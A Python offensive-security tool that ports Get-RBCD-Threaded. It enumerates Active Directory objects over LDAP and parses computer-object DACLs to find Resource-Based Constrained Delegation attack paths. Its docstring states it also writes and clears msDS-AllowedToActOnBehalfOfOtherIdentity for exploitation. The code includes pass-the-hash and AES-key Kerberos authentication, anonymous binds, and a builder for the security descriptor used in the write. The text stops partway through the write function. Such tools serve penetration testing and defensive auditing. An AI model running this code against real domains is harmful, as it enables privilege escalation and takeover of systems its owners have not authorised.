#!/usr/bin/env python3
"""
get-rbcd.py - Python port of Get-RBCD-Threaded by FatRodzianko
https://github.com/FatRodzianko/Get-RBCD-Threaded

Discovers and exploits Resource-Based Constrained Delegation (RBCD) attack paths
in Active Directory.

Enumerates users, groups, and computer objects, then checks DACLs on computer objects
for principals with GenericAll, GenericWrite, WriteOwner, WriteDacl, or WriteProp
(on msDS-AllowedToActOnBehalfOfOtherIdentity) permissions.

Can also write/clear msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD exploitation
and cleanup, including via anonymous/null LDAP sessions.

Enhancements over original:
  - Pure Python (ldap3) - runs natively on Kali Linux, no impacket required
  - Anonymous / Guest / null-session LDAP bind support
  - Checks write permissions on the DC computer object itself
  - RBCD write and cleanup functionality (--write-rbcd / --clear-rbcd)
  - Kerberos authentication support
  - Concurrent ACL processing with ThreadPoolExecutor
  - JSON output option alongside CSV
  - Color-coded terminal output
  - Source type tagging (User / Group / Computer) in results
  - Non-privileged group RBCD paths detected via normalize_sid()
  - Pass-the-hash (--hashes LM:NT) via NTLM
  - AES-128/256 key auth (--aes-key) via impacket TGT request
  - Existing ccache ticket auth (--ccache / KRB5CCNAME)

Author: Mitchell (ported from C# by FatRodzianko)
"""

import argparse
import ast
import csv
import json
import os
import sys
import time
import struct
import re
import tempfile
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict, field
from typing import Optional

try:
    import ldap3
    from ldap3 import Server, Connection, ALL, NONE, NTLM, SASL, KERBEROS, ANONYMOUS, SIMPLE
    from ldap3 import ALL_ATTRIBUTES, ALL_OPERATIONAL_ATTRIBUTES
    from ldap3.utils.conv import escape_filter_chars
except ImportError:
    print("[!] ldap3 is required: pip install ldap3")
    sys.exit(1)

# impacket is optional — only required for --aes-key
try:
    from impacket.krb5.kerberosv5 import getKerberosTGT
    from impacket.krb5 import constants as krb5_constants
    from impacket.krb5.types import Principal
    from impacket.krb5.ccache import CCache
    IMPACKET_AVAILABLE = True
except ImportError:
    IMPACKET_AVAILABLE = False


# =============================================================================
# Constants
# =============================================================================

RBCD_GUID = "3f78c3e5-f79a-46bd-a0b8-9d18116ddc79"

ADS_RIGHT_GENERIC_ALL   = 0x10000000
ADS_RIGHT_GENERIC_WRITE = 0x40000000
ADS_RIGHT_WRITE_OWNER   = 0x00080000
ADS_RIGHT_WRITE_DACL    = 0x00040000
ADS_RIGHT_DS_WRITE_PROP = 0x00000020

ACCESS_ALLOWED_ACE_TYPE        = 0x00
ACCESS_ALLOWED_OBJECT_ACE_TYPE = 0x05
ACE_OBJECT_TYPE_PRESENT        = 0x01

# Privileged groups to exclude — stored lowercase for case-insensitive comparison
PRIVILEGED_GROUPS = {
    "domain admins",
    "account operators",
    "enterprise admins",
    "administrators",
    "dnsadmins",
    "schema admins",
    "key admins",
    "enterprise key admins",
    "storage replica administrators",
    "builtin\\administrators",
}

SAM_USER_OBJECT     = 805306368
SAM_COMPUTER_OBJECT = 805306369


# =============================================================================
# Colors
# =============================================================================

class Colors:
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    BOLD    = "\033[1m"
    RESET   = "\033[0m"


def cprint(msg, color=Colors.RESET):
    print(f"{color}{msg}{Colors.RESET}")


def build_sd_control(sdflags=0x04):
    value = bytes([0x30, 0x03, 0x02, 0x01, sdflags & 0xFF])
    return ('1.2.840.113556.1.4.801', True, value)


# =============================================================================
# Data classes
# =============================================================================

@dataclass
class SidMapping:
    """Maps an objectSID to its sAMAccountName, domain, and object type."""
    object_sid: str
    sam_account_name: str
    domain_name: str
    object_type: str = "Unknown"  # "User", "Group", "Computer"


@dataclass
class RBCDResult:
    """Represents a discovered RBCD attack path."""
    source: str           # Principal with write access
    source_sid: str       # SID of the source principal
    source_domain: str    # Domain of the source principal
    source_type: str      # "User", "Group", "Computer", "Well-Known"
    destination: str      # Target computer (dNSHostName or sAMAccountName)
    destination_dn: str   # Distinguished name of the target
    privilege: str        # GenericAll, GenericWrite, WriteOwner, WriteDacl, WriteProp
    is_dc: bool = False   # Whether the destination is a Domain Controller


# =============================================================================
# Security Descriptor Parsing
# =============================================================================

def parse_sid(data: bytes, offset: int = 0) -> str:
    """Parse a binary SID into string format S-1-..."""
    if len(data) - offset < 8:
        return ""
    revision = data[offset]
    sub_authority_count = data[offset + 1]
    authority = int.from_bytes(data[offset + 2:offset + 8], byteorder='big')
    sids = [f"S-{revision}-{authority}"]
    for i in range(sub_authority_count):
        sub_offset = offset + 8 + (i * 4)
        if sub_offset + 4 > len(data):
            break
        sub_auth = struct.unpack('<I', data[sub_offset:sub_offset + 4])[0]
        sids.append(str(sub_auth))
    return "-".join(sids)


def sid_length(data: bytes, offset: int = 0) -> int:
    if len(data) - offset < 2:
        return 0
    sub_authority_count = data[offset + 1]
    return 8 + (sub_authority_count * 4)


def sid_to_bytes(sid_string: str) -> bytes:
    parts = sid_string.split('-')
    revision = int(parts[1])
    authority = int(parts[2])
    sub_authorities = [int(x) for x in parts[3:]]
    sid_bytes = struct.pack('BB', revision, len(sub_authorities))
    sid_bytes += authority.to_bytes(6, byteorder='big')
    for sa in sub_authorities:
        sid_bytes += struct.pack('<I', sa)
    return sid_bytes


def normalize_sid(raw_sid) -> str:
    """
    Normalize a SID to S-1-... string format regardless of how ldap3 returned it.
    ldap3 can return objectSid as bytes, Attribute objects, bytes-repr strings,
    or already-formatted S-1-... strings. This ensures consistent format for
    set lookups against binary-parsed ACE SIDs.
    """
    if raw_sid is None:
        return ""
    # List — take first element recursively
    if isinstance(raw_sid, list):
        return normalize_sid(raw_sid[0]) if raw_sid else ""
    # Raw bytes — parse directly
    if isinstance(raw_sid, bytes):
        return parse_sid(raw_sid)
    sid_str = str(raw_sid)
    # ldap3 sometimes returns bytes repr: b'\x01\x05...'
    if sid_str.startswith("b'") or sid_str.startswith('b"'):
        try:
            raw_bytes = ast.literal_eval(sid_str)
            if isinstance(raw_bytes, bytes):
                return parse_sid(raw_bytes)
        except Exception:
            pass
    # Already in S-1-... format
    if sid_str.upper().startswith("S-1-"):
        return sid_str
    return sid_str


def build_rbcd_sd(delegate_from_sid: str) -> bytes:
    sid_bytes = sid_to_bytes(delegate_from_sid)
    access_mask = 0x000F01FF
    ace_body = struct.pack('<I', access_mask) + sid_bytes
    ace_size = 4 + len(ace_body)
    ace = struct.pack('<BBH', 0x00, 0x00, ace_size) + ace_body
    acl_size = 8 + len(ace)
    dacl = struct.pack('<BBHHH', 0x02, 0x00, acl_size, 1, 0x00) + ace
    owner_sid = sid_to_bytes("S-1-0-0")
    sd_header_size = 20
    offset_owner = sd_header_size
    offset_dacl = offset_owner + len(owner_sid)
    offset_group = 0
    offset_sacl = 0
    control = 0x8004
    sd = struct.pack('<BBH', 0x01, 0x00, control)
    sd += struct.pack('<IIII', offset_owner, offset_group, offset_sacl, offset_dacl)
    sd += owner_sid
    sd += dacl
    return sd


def parse_guid(data: bytes) -> str:
    if len(data) < 16:
        return ""
    d1 = struct.unpack('<I', data[0:4])[0]
    d2 = struct.unpack('<H', data[4:6])[0]
    d3 = struct.unpack('<H', data[6:8])[0]
    d4 = data[8:16]
    return f"{d1:08x}-{d2:04x}-{d3:04x}-{d4[0]:02x}{d4[1]:02x}-{d4[2]:02x}{d4[3]:02x}{d4[4]:02x}{d4[5]:02x}{d4[6]:02x}{d4[7]:02x}"


def parse_acl(data: bytes):
    if len(data) < 8:
        return
    ace_count = struct.unpack('<H', data[4:6])[0]
    offset = 8
    for _ in range(ace_count):
        if offset + 4 > len(data):
            break
        ace_type  = data[offset]
        ace_flags = data[offset + 1]
        ace_size  = struct.unpack('<H', data[offset + 2:offset + 4])[0]
        if ace_size < 4 or offset + ace_size > len(data):
            break
        ace_data = data[offset:offset + ace_size]

        if ace_type == ACCESS_ALLOWED_ACE_TYPE:
            if len(ace_data) >= 8:
                access_mask = struct.unpack('<I', ace_data[4:8])[0]
                sid = parse_sid(ace_data, 8)
                yield {"ace_type": ace_type, "ace_flags": ace_flags,
                       "access_mask": access_mask, "sid": sid, "object_type_guid": None}

        elif ace_type == ACCESS_ALLOWED_OBJECT_ACE_TYPE:
            if len(ace_data) >= 12:
                access_mask = struct.unpack('<I', ace_data[4:8])[0]
                obj_flags   = struct.unpack('<I', ace_data[8:12])[0]
                guid_offset = 12
                object_type_guid = None
                if obj_flags & ACE_OBJECT_TYPE_PRESENT:
                    if guid_offset + 16 <= len(ace_data):
                        object_type_guid = parse_guid(ace_data[guid_offset:guid_offset + 16])
                        guid_offset += 16
                if obj_flags & 0x02:
                    if guid_offset + 16 <= len(ace_data):
                        guid_offset += 16
                sid = parse_sid(ace_data, guid_offset)
                yield {"ace_type": ace_type, "ace_flags": ace_flags,
                       "access_mask": access_mask, "sid": sid, "object_type_guid": object_type_guid}

        offset += ace_size


def parse_security_descriptor(raw_sd: bytes):
    if len(raw_sd) < 20:
        return []
    dacl_offset = struct.unpack('<I', raw_sd[16:20])[0]
    if dacl_offset == 0 or dacl_offset >= len(raw_sd):
        return []
    return list(parse_acl(raw_sd[dacl_offset:]))


# =============================================================================
# LDAP Helpers
# =============================================================================

def get_tgt_with_aes(username, domain, aes_key, dc_host) -> str:
    """
    Request a TGT using an AES-128 or AES-256 key via impacket,
    save it to a temp ccache file, and return the file path.
    Caller is responsible for setting KRB5CCNAME and cleanup.
    """
    if not IMPACKET_AVAILABLE:
        cprint("[!] --aes-key requires impacket: pip install impacket", Colors.RED)
        sys.exit(1)

    aes_bytes = bytes.fromhex(aes_key)
    if len(aes_bytes) == 16:
        etype = krb5_constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value
        cprint(f"[*] AES-128 key detected", Colors.YELLOW)
    elif len(aes_bytes) == 32:
        etype = krb5_constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value
        cprint(f"[*] AES-256 key detected", Colors.YELLOW)
    else:
        cprint(f"[!] Invalid AES key length ({len(aes_bytes)} bytes). Must be 16 (AES-128) or 32 (AES-256).", Colors.RED)
        sys.exit(1)

    user_principal = Principal(username, type=krb5_constants.PrincipalNameType.NT_PRINCIPAL.value)
    cprint(f"[*] Requesting TGT for {username}@{domain.upper()} using AES key...", Colors.YELLOW)

    tgt, cipher, old_session_key, session_key = getKerberosTGT(
        clientName=user_principal,
        password="",
        domain=domain,
        lmhash=b"",
        nthash=b"",
        aesKey=aes_key,
        kdcHost=dc_host,
    )

    # Save to temp ccache
    ccache = CCache()
    ccache.fromTGT(tgt, old_session_key, session_key)
    tmp = tempfile.NamedTemporaryFile(suffix=".ccache", delete=False)
    ccache.saveFile(tmp.name)
    cprint(f"[+] TGT obtained, saved to {tmp.name}", Colors.GREEN)
    return tmp.name


def derive_aes256_from_password(password: str, username: str, domain: str) -> str:
    """
    Derive an AES-256 Kerberos key from a plaintext password using string2key.
    Salt is DOMAIN.UPPERusername (standard AD Kerberos salt).
    Returns the key as a hex string ready for get_tgt_with_aes().
    """
    if not IMPACKET_AVAILABLE:
        cprint("[!] --use-aes requires impacket: pip install impacket", Colors.RED)
        sys.exit(1)

    from impacket.krb5 import crypto as krb5_crypto

    # Standard AD salt: uppercase domain + lowercase username
    # For computer accounts the salt is DOMAIN.UPPERhostname (without $)
    sam = username.rstrip("$")
    salt = f"{domain.upper()}{sam}"
    cprint(f"[*] Deriving AES-256 key from password (salt: {salt})", Colors.YELLOW)

    key = krb5_crypto.string_to_key(
        krb5_crypto.Enctype.AES256,
        password.encode("utf-8"),
        salt.encode("utf-8"),
    )
    hex_key = key.contents.hex()
    cprint(f"[+] AES-256 key: {hex_key}", Colors.GREEN)
    return hex_key


def create_connection(args) -> tuple:
    dc_ip   = args.dc_ip or args.domain
    # For Kerberos, SPN must match a registered hostname — use --dc-host if provided,
    # otherwise fall back to dc_ip (works if it resolves to the DC's registered name)
    dc_host = getattr(args, "dc_host", None) or dc_ip
    use_ssl = not args.insecure
    port    = 636 if use_ssl else 389

    # When using Kerberos, Server() must use the FQDN so ldap3 builds the correct SPN
    # (ldap/IT-DC01.it.gcb.local, not ldap/192.168.4.2). proxychains resolves the FQDN
    # via /etc/hosts. For NTLM/anonymous, the IP is fine.
    using_kerberos = (
        getattr(args, "use_aes", False) or
        getattr(args, "aes_key", None) or
        getattr(args, "ccache", None) or
        getattr(args, "kerberos", False)
    )
    server_host = dc_host if using_kerberos else dc_ip
    server  = Server(server_host, port=port, use_ssl=use_ssl, get_info=NONE, connect_timeout=30)
    base_dn = ",".join([f"DC={part}" for part in args.domain.split(".")])

    _tmp_ccache = None  # track temp file for cleanup

    # ── Derive AES256 from password then request TGT ──────────────────────────
    if getattr(args, "use_aes", False) and args.username and args.password:
        aes_key = derive_aes256_from_password(args.password, args.username, args.domain)
        _tmp_ccache = get_tgt_with_aes(args.username, args.domain, aes_key, dc_ip)
        os.environ["KRB5CCNAME"] = _tmp_ccache
        cprint(f"[*] KRB5CCNAME={_tmp_ccache}", Colors.YELLOW)
        cprint(f"[*] Attempting Kerberos (derived AES-256) auth to {dc_host}:{port} as {args.username}", Colors.YELLOW)
        conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, receive_timeout=60)
        if not conn.bind():
            raise Exception(f"Kerberos (derived AES-256) bind failed: {conn.result}")

    # ── Anonymous ─────────────────────────────────────────────────────────────
    elif args.anonymous:
        cprint(f"[*] Attempting anonymous bind to {dc_host}:{port}", Colors.YELLOW)
        conn = Connection(server, authentication=ANONYMOUS, receive_timeout=60)
        if not conn.bind():
            raise Exception(f"Anonymous bind failed: {conn.result}")

    # ── AES key → impacket TGT → Kerberos ────────────────────────────────────
    elif getattr(args, "aes_key", None):
        _tmp_ccache = get_tgt_with_aes(args.username, args.domain, args.aes_key, dc_ip)
        os.environ["KRB5CCNAME"] = _tmp_ccache
        cprint(f"[*] KRB5CCNAME={_tmp_ccache}", Colors.YELLOW)
        cprint(f"[*] Attempting Kerberos (AES) auth to {dc_host}:{port} as {args.username}", Colors.YELLOW)
        conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, receive_timeout=60)
        if not conn.bind():
            raise Exception(f"Kerberos (AES) bind failed: {conn.result}")

    # ── Existing ccache / KRB5CCNAME ──────────────────────────────────────────
    elif getattr(args, "ccache", None):
        ccache_path = args.ccache
        if not os.path.isfile(ccache_path):
            raise Exception(f"ccache file not found: {ccache_path}")
        os.environ["KRB5CCNAME"] = ccache_path
        cprint(f"[*] KRB5CCNAME={ccache_path}", Colors.YELLOW)
        cprint(f"[*] Attempting Kerberos (ccache) auth to {dc_host}:{port}", Colors.YELLOW)
        conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, receive_timeout=60)
        if not conn.bind():
            raise Exception(f"Kerberos (ccache) bind failed: {conn.result}")

    # ── Kerberos with password ─────────────────────────────────────────────────
    elif getattr(args, "kerberos", False) and args.username and args.password:
        cprint(f"[*] Attempting Kerberos (password) auth to {dc_host}:{port} as {args.username}", Colors.YELLOW)
        conn = Connection(server, user=args.username, password=args.password,
                          authentication=SASL, sasl_mechanism=KERBEROS, receive_timeout=60)
        if not conn.bind():
            raise Exception(f"Kerberos bind failed: {conn.result}")

    # ── Pass-the-hash (LM:NT or :NT) ──────────────────────────────────────────
    elif getattr(args, "hashes", None):
        parts = args.hashes.split(":")
        if len(parts) == 2:
            lm_hash, nt_hash = parts
        else:
            lm_hash, nt_hash = "aad3b435b51404eeaad3b435b51404ee", parts[0]

        if "\\" in args.username:
            ntlm_user = args.username
        elif "@" in args.username:
            u, d = args.username.split("@", 1)
            ntlm_user = f"{d}\\{u}"
        else:
            ntlm_user = f"{args.domain}\\{args.username}"

        # ldap3 NTLM accepts hash as password in LM:NT format
        cprint(f"[*] Attempting pass-the-hash to {dc_host}:{port} as {ntlm_user}", Colors.YELLOW)
        conn = Connection(server, user=ntlm_user,
                          password=f"{lm_hash}:{nt_hash}",
                          authentication=NTLM, receive_timeout=60)
        if not conn.bind():
            raise Exception(f"Pass-the-hash bind failed: {conn.result}")

    # ── NTLM with password ────────────────────────────────────────────────────
    elif args.username and args.password:
        if "\\" in args.username:
            ntlm_user = args.username
        elif "@" in args.username:
            parts = args.username.split("@")
            ntlm_user = f"{parts[1]}\\{parts[0]}"
        else:
            ntlm_user = f"{args.domain}\\{args.username}"
        cprint(f"[*] Attempting NTLM auth to {dc_host}:{port} as {ntlm_user}", Colors.YELLOW)
        conn = Connection(server, user=ntlm_user, password=args.password, authentication=NTLM, receive_timeout=60)
        if not conn.bind():
            cprint(f"[*] NTLM failed, trying SIMPLE bind...", Colors.YELLOW)
            simple_user = args.username if "@" in args.username else f"{args.username}@{args.domain}"
            conn = Connection(server, user=simple_user, password=args.password, authentication=SIMPLE, receive_timeout=60)
            if not conn.bind():
                raise Exception(f"All bind attempts failed. Last result: {conn.result}")

    # ── Anonymous fallback ────────────────────────────────────────────────────
    else:
        cprint(f"[*] No credentials supplied, attempting anonymous bind to {dc_host}:{port}", Colors.YELLOW)
        conn = Connection(server, authentication=ANONYMOUS, receive_timeout=60)
        if not conn.bind():
            raise Exception(f"Anonymous bind failed: {conn.result}")

    cprint(f"[+] Successfully bound to {dc_ip}:{port} (Kerberos SPN host: {dc_host})" if dc_host != dc_ip else f"[+] Successfully bound to {dc_ip}:{port}", Colors.GREEN)
    cprint(f"[*] Base DN: {base_dn}", Colors.CYAN)

    # Store temp ccache path on conn for cleanup after unbind
    conn._tmp_ccache = _tmp_ccache
    return conn, base_dn


def paged_search(conn, base_dn, search_filter, attributes, controls=None):
    results = []
    paged_size = 1000
    try:
        entry_generator = conn.extend.standard.paged_search(
            search_base=base_dn, search_filter=search_filter,
            search_scope=ldap3.SUBTREE, attributes=attributes,
            controls=controls, paged_size=paged_size, generator=True,
        )
        for entry in entry_generator:
            if entry.get("type") == "searchResEntry":
                results.append(entry)
    except Exception as e:
        cprint(f"[*] Paged search with controls failed ({e}), trying fallback...", Colors.YELLOW)
        cookie = None
        while True:
            conn.search(search_base=base_dn, search_filter=search_filter,
                        search_scope=ldap3.SUBTREE, attributes=attributes,
                        controls=controls, paged_size=paged_size, paged_cookie=cookie)
            for entry in conn.response:
                if entry.get("type") == "searchResEntry":
                    results.append(entry)
            cookie = conn.result.get("controls", {}).get(
                "1.2.840.113556.1.4.319", {}).get("value", {}).get("cookie")
            if not cookie:
                break
    return results


# =============================================================================
# Enumeration Functions
# =============================================================================

def get_users(conn, base_dn, domain) -> tuple:
    cprint(f"\n[*] Enumerating users in {domain}...", Colors.CYAN)
    entries = paged_search(conn, base_dn, "(samAccountType=805306368)", ["objectSid", "sAMAccountName"])
    sid_list, sid_map_list = [], []
    for entry in entries:
        attrs   = entry.get("attributes", {})
        raw_sid = attrs.get("objectSid")
        sam     = attrs.get("sAMAccountName", "")
        if isinstance(sam, list): sam = sam[0] if sam else ""
        sam = str(sam)
        if raw_sid:
            sid_str = normalize_sid(raw_sid)
            if sid_str:
                sid_list.append(sid_str)
                sid_map_list.append(SidMapping(sid_str, sam, domain, "User"))
    cprint(f"[+] Found {len(sid_list)} users in {domain}", Colors.GREEN)
    return sid_list, sid_map_list


def get_groups(conn, base_dn, domain) -> tuple:
    """
    Enumerate all non-privileged groups. Uses case-insensitive filter against
    PRIVILEGED_GROUPS so groups like ITEMPLOYEESMACHINES are correctly included
    and their SIDs are normalized to match binary-parsed ACE SIDs.
    """
    cprint(f"[*] Enumerating groups in {domain}...", Colors.CYAN)
    entries = paged_search(conn, base_dn, "(objectCategory=group)", ["objectSid", "sAMAccountName"])
    sid_list, sid_map_list = [], []
    skipped = 0
    for entry in entries:
        attrs   = entry.get("attributes", {})
        sam     = attrs.get("sAMAccountName", "")
        if isinstance(sam, list): sam = sam[0] if sam else ""
        sam = str(sam)
        raw_sid = attrs.get("objectSid")
        # Case-insensitive privileged group filter
        if sam.lower() in PRIVILEGED_GROUPS:
            skipped += 1
            continue
        if raw_sid:
            sid_str = normalize_sid(raw_sid)
            if sid_str:
                sid_list.append(sid_str)
                sid_map_list.append(SidMapping(sid_str, sam, domain, "Group"))
    cprint(f"[+] Found {len(sid_list)} non-privileged groups in {domain} (skipped {skipped} privileged)", Colors.GREEN)
    return sid_list, sid_map_list


def get_computers(conn, base_dn, domain, pwd_last_set_days=0) -> tuple:
    cprint(f"[*] Enumerating computers in {domain}...", Colors.CYAN)
    if pwd_last_set_days > 0:
        epoch    = datetime(1601, 1, 1)
        cutoff   = datetime.now() - timedelta(days=pwd_last_set_days)
        filetime = int((cutoff - epoch).total_seconds() * 10_000_000)
        search_filter = f"(&(samAccountType=805306369)(pwdLastSet>={filetime}))"
        cprint(f"[*] Filtering computers with pwdLastSet within {pwd_last_set_days} days", Colors.YELLOW)
    else:
        search_filter = "(samAccountType=805306369)"

    attributes = ["sAMAccountName", "nTSecurityDescriptor", "objectSid",
                  "dNSHostName", "distinguishedName", "userAccountControl"]
    sd_control = build_sd_control(sdflags=0x04)
    entries = paged_search(conn, base_dn, search_filter, attributes, controls=[sd_control])

    sid_list, sid_map_list, computer_entries = [], [], []
    for entry in entries:
        attrs   = entry.get("attributes", {})
        raw_sid = attrs.get("objectSid")
        sam     = attrs.get("sAMAccountName", "")
        if isinstance(sam, list): sam = sam[0] if sam else ""
        sam = str(sam)
        sid_str = ""
        if raw_sid:
            sid_str = normalize_sid(raw_sid)
            if sid_str:
                sid_list.append(sid_str)
                sid_map_list.append(SidMapping(sid_str, sam, domain, "Computer"))
        uac = attrs.get("userAccountControl", 0)
        if isinstance(uac, list):
            uac = uac[0] if uac else 0
        is_dc = bool(int(uac) & 0x2000)
        computer_entries.append({"attrs": attrs, "sid": sid_str, "is_dc": is_dc})

    cprint(f"[+] Found {len(computer_entries)} computers in {domain}", Colors.GREEN)
    dc_count = sum(1 for c in computer_entries if c["is_dc"])
    if dc_count:
        cprint(f"[!] {dc_count} of these are Domain Controllers", Colors.MAGENTA)
    return sid_list, sid_map_list, computer_entries


# =============================================================================
# ACL Analysis
# =============================================================================

def check_rbcd_aces(computer_entry, all_sids_set, sid_map_dict) -> list:
    results       = []
    attrs         = computer_entry["attrs"]
    computer_sid  = computer_entry["sid"]
    is_dc         = computer_entry["is_dc"]

    raw_sd = attrs.get("nTSecurityDescriptor")
    if not raw_sd:
        return results
    if isinstance(raw_sd, bytes):
        sd_bytes = raw_sd
    elif isinstance(raw_sd, list) and raw_sd:
        sd_bytes = raw_sd[0] if isinstance(raw_sd[0], bytes) else raw_sd
    else:
        return results

    hostname = attrs.get("dNSHostName", "")
    if isinstance(hostname, list):
        hostname = hostname[0] if hostname else ""
    hostname = str(hostname) or str(attrs.get("sAMAccountName", "UNKNOWN"))

    dn = attrs.get("distinguishedName", "")
    if isinstance(dn, list):
        dn = str(dn[0]) if dn else ""
    else:
        dn = str(dn)

    for ace in parse_security_descriptor(sd_bytes):
        sid         = ace["sid"]
        access_mask = ace["access_mask"]
        obj_guid    = ace.get("object_type_guid")
        ace_flags   = ace.get("ace_flags", 0)

        # Skip inherited ACEs (flag 0x10 = INHERITED_ACE).
        # Domain Admins WriteOwner on every computer is a default inherited permission,
        # not an explicit attack path. Only explicit ACEs are actionable.
        if ace_flags & 0x10:
            continue

        if sid == computer_sid:
            continue
        if sid not in all_sids_set:
            continue

        privilege = None
        if access_mask & ADS_RIGHT_GENERIC_ALL:
            privilege = "GenericAll"
        elif access_mask & ADS_RIGHT_GENERIC_WRITE:
            privilege = "GenericWrite"
        elif access_mask & ADS_RIGHT_WRITE_OWNER:
            privilege = "WriteOwner"
        elif access_mask & ADS_RIGHT_WRITE_DACL:
            privilege = "WriteDacl"
        elif access_mask & ADS_RIGHT_DS_WRITE_PROP:
            if obj_guid and obj_guid.lower() == RBCD_GUID:
                privilege = "WriteProp (msDS-AllowedToActOnBehalfOfOtherIdentity)"
            elif obj_guid is None:
                privilege = "WriteAllProperties"

        if privilege:
            mapping     = sid_map_dict.get(sid)
            source_name = mapping.sam_account_name if mapping else sid
            source_dom  = mapping.domain_name if mapping else "UNKNOWN"
            source_type = mapping.object_type if mapping else "Unknown"
            results.append(RBCDResult(
                source=source_name, source_sid=sid, source_domain=source_dom,
                source_type=source_type, destination=hostname, destination_dn=dn,
                privilege=privilege, is_dc=is_dc,
            ))
    return results


def check_anonymous_rbcd(args, base_dn):
    cprint(f"\n{'='*70}", Colors.MAGENTA)
    cprint("[*] BONUS: Checking anonymous/guest write access on computer objects...", Colors.MAGENTA)
    cprint(f"{'='*70}", Colors.MAGENTA)

    dc_host = args.dc_ip or args.domain
    try:
        server    = Server(dc_host, port=389, use_ssl=False, get_info=NONE, connect_timeout=30)
        anon_conn = Connection(server, authentication=ANONYMOUS, receive_timeout=60)
        if not anon_conn.bind():
            cprint(f"[-] Anonymous bind failed: {anon_conn.result}", Colors.RED)
            return []
        cprint("[+] Anonymous bind successful", Colors.GREEN)
    except Exception as e:
        cprint(f"[-] Anonymous bind failed: {e}", Colors.RED)
        return []

    attributes = ["sAMAccountName", "nTSecurityDescriptor", "objectSid",
                  "dNSHostName", "distinguishedName", "userAccountControl"]
    anon_sids = {"S-1-1-0", "S-1-5-7", "S-1-5-11"}
    sid_names = {"S-1-1-0": "Everyone", "S-1-5-7": "ANONYMOUS LOGON", "S-1-5-11": "Authenticated Users"}

    results = []
    try:
        entries = paged_search(anon_conn, base_dn, "(samAccountType=805306369)",
                               attributes, controls=[build_sd_control(sdflags=0x04)])
        cprint(f"[*] Retrieved {len(entries)} computer objects via anonymous bind", Colors.CYAN)

        for entry in entries:
            attrs  = entry.get("attributes", {})
            raw_sd = attrs.get("nTSecurityDescriptor")
            if not raw_sd:
                continue
            if isinstance(raw_sd, bytes):
                sd_bytes = raw_sd
            elif isinstance(raw_sd, list) and raw_sd:
                sd_bytes = raw_sd[0] if isinstance(raw_sd[0], bytes) else raw_sd
            else:
                continue

            hostname = attrs.get("dNSHostName", attrs.get("sAMAccountName", "UNKNOWN"))
            if isinstance(hostname, list):
                hostname = str(hostname[0]) if hostname else "UNKNOWN"
            else:
                hostname = str(hostname) if hostname else "UNKNOWN"

            dn = attrs.get("distinguishedName", "")
            if isinstance(dn, list):
                dn = str(dn[0]) if dn else ""
            else:
                dn = str(dn)

            uac = attrs.get("userAccountControl", 0)
            if isinstance(uac, list):
                uac = uac[0] if uac else 0
            is_dc = bool(int(uac) & 0x2000)

            for ace in parse_security_descriptor(sd_bytes):
                sid         = ace["sid"]
                access_mask = ace["access_mask"]
                obj_guid    = ace.get("object_type_guid")
                if sid not in anon_sids:
                    continue
                privilege = None
                if access_mask & ADS_RIGHT_GENERIC_ALL:
                    privilege = "GenericAll"
                elif access_mask & ADS_RIGHT_GENERIC_WRITE:
                    privilege = "GenericWrite"
                elif access_mask & ADS_RIGHT_WRITE_OWNER:
                    privilege = "WriteOwner"
                elif access_mask & ADS_RIGHT_WRITE_DACL:
                    privilege = "WriteDacl"
                elif access_mask & ADS_RIGHT_DS_WRITE_PROP:
                    if obj_guid and obj_guid.lower() == RBCD_GUID:
                        privilege = "WriteProp (msDS-AllowedToActOnBehalfOfOtherIdentity)"
                    elif obj_guid is None:
                        privilege = "WriteAllProperties"
                if privilege:
                    results.append(RBCDResult(
                        source=sid_names.get(sid, sid), source_sid=sid,
                        source_domain="WELL-KNOWN", source_type="Well-Known",
                        destination=hostname, destination_dn=dn,
                        privilege=privilege, is_dc=is_dc,
                    ))
    except Exception as e:
        cprint(f"[-] Error during anonymous enumeration: {e}", Colors.RED)
    finally:
        try:
            anon_conn.unbind()
        except Exception:
            pass

    if results:
        cprint(f"\n[!!!] CRITICAL: Found {len(results)} anonymous/guest writable computer objects!", Colors.RED)
        for r in results:
            dc_tag = " [DOMAIN CONTROLLER]" if r.is_dc else ""
            cprint(f"  {r.source} -> {r.destination}{dc_tag} ({r.privilege})", Colors.RED)
    else:
        cprint("[-] No anonymous/guest write access found on computer objects", Colors.YELLOW)
    return results


# =============================================================================
# RBCD Write / Clear Operations
# =============================================================================

def resolve_sid(conn, base_dn, identifier, domain) -> str:
    if identifier.upper().startswith("S-1-"):
        return identifier
    search_filter = f"(sAMAccountName={escape_filter_chars(identifier)})"
    conn.search(base_dn, search_filter, attributes=["objectSid"], search_scope=ldap3.SUBTREE)
    if conn.entries:
        raw_sid = conn.entries[0]["objectSid"].raw_values[0]
        return parse_sid(raw_sid) if isinstance(raw_sid, bytes) else str(raw_sid)
    cprint(f"[!] Could not resolve '{identifier}' to a SID", Colors.RED)
    return None


def resolve_target_dn(conn, base_dn, target) -> str:
    if target.upper().startswith("CN="):
        return target
    sam = target if target.endswith("$") else f"{target}$"
    search_filter = f"(&(samAccountType=805306369)(|(sAMAccountName={escape_filter_chars(sam)})(dNSHostName={escape_filter_chars(target)})))"
    conn.search(base_dn, search_filter, attributes=["distinguishedName"], search_scope=ldap3.SUBTREE)
    if conn.entries:
        return str(conn.entries[0]["distinguishedName"].value)
    cprint(f"[!] Could not resolve target '{target}' to a DN", Colors.RED)
    return None


def write_rbcd(args, base_dn):
    cprint(f"\n{'='*70}", Colors.RED)
    cprint("[*] RBCD WRITE MODE - Modifying Active Directory", Colors.RED)
    cprint(f"{'='*70}\n", Colors.RED)

    dc_host  = args.dc_ip or args.domain
    use_ssl  = not args.insecure
    port     = 636 if use_ssl else 389
    server   = Server(dc_host, port=port, use_ssl=use_ssl, get_info=NONE, connect_timeout=30)

    if args.anonymous or (not args.username and not args.password):
        cprint(f"[*] Using anonymous bind for RBCD write to {dc_host}:{port}", Colors.YELLOW)
        conn = Connection(server, authentication=ANONYMOUS, receive_timeout=60)
    elif args.username and args.password:
        ntlm_user = args.username if "\\" in args.username else f"{args.domain}\\{args.username}"
